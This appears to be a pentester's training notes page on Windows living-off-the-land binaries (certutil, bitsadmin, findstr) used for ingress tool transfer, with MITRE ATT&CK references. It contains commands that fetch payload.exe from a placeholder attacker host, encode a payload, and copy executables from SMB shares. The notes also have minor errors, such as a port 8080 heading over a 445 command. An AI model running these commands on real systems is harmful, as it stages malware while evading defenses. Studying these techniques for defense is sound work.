## Table of Contents

- [certutil.exe to download a file from an attacker's web server and store it in the Window's temporary folder #windows #certutil #download #exiltrate](#certutil.exe to\download\a\file\from\an\attacker's\web\server\and\store\it\in\the\Window's\temporary\folder\#windows\#certutil\#download\#exiltrate)
      - [ used as an encoding tool where we can encode files](# used\as\an\encoding\tool\where\we\can\encode\files)
- [BITSAdmin](#bitsadmin)
- [FindStr](#findstr)
          - [Check whether port 8080 is open on our machine then pipe the result of netstat to find that port as follows:](#Check\whether\port\8080\is\open\on\our\machine\then\pipe\the\result\of\netstat\to\find\that\port\as\follows:)
          - [Unintended way using findstr to download remote files from smb shared folders](#Unintended\way\using\findstr\to\download\remote\files\from\smb\shared\folders)
    - [Examples](#Examples)
      - [1. Downloading an Executable from a Remote SMB Share](#1.\Downloading\an\Executable\from\a\Remote\SMB\Share)

 #certutil #windows #pentest #LivingOffTheLand #LoL 
**Certutil** is a Windows built-in utility for handling certification services. It is used to dump and display Certification Authority (CA) configuration information and other CA components.

the tool's normal use is to retrieve certificate information. However, people found that certutil.exe could transfer and encode files unrelated to certification services. *The MITRE ATT&CK framework identifies this technique as* **Ingress tool transfer** ([T1105](https://attack.mitre.org/techniques/T1105/)).



#### certutil.exe to download a file from an attacker's web server and store it in the Window's temporary folder #windows #certutil #download #exiltrate
```powershell
certutil -URLcache -split -f http://Attacker_IP/payload.exe \ C:\Windows\Temp\payload.exe

-urlcache : dispaly URL; enables the URL use in cmd
-split -f : split and force fetching files from URL
```

####  used as an encoding tool where we can encode files
```powershell
certutil -encode payload.exe Encoded-payload.txt
```
[CertUtil Documentaiton](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)



# BITSAdmin
	Background Intelligent Transfer Service (BITS) 

- Sysadmin too to create, download, or upload BITS jobs and check their progess. BITS is low-bandwidth and asynchronous method to download and upload files form HTTP webservers and SMB servers.
[BITS Docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin)
ATT&CK [T1197](https://attack.mitre.org/techniques/T1197/) page.
#bitsadmin 
#BITS
	Example:
```powershell
C:\Users\Autist>bitsadmin.exe /transfer /Download /priority Foreground http://ATTACKER_IP/payload.exe C:\Users\Autist\Desktop\payload.exe
```
	/Transfer | use the transfer option  
	/Download | specifying transfer using download type  
	/Priority | setting the priority of the job to be running in the foreground


# FindStr

	Find text and string patters in files. 

Example:
###### Check whether port 8080 is open on our machine then pipe the result of netstat to find that port as follows:
```powershell
 netstat -an| findstr "445"
```


###### Unintended way using findstr to download remote files from smb shared folders
```powershell
C:\Users\thm>findstr /V dummystring \\MACHINENAME\SharedFoled\test.exe > c:\Windows\temp\test.exe
```
	/V : prints only lines that do not contain 'dummystring'
	\\MachineName\SharedFolder\text.exe : specifies the SMB share and file to read from
	> c:\Windows\Temp\test.exe: Redirects the output to a local file.

### Examples

#### 1. Downloading an Executable from a Remote SMB Share

Suppose you have an executable `my_program.exe` in an SMB share `\\RemoteMachine\SharedFiles`.

```powershell
findstr /V non_existent_string \\RemoteMachine\SharedFiles\my_program.exe > C:\LocalFolder\my_program.exe
```











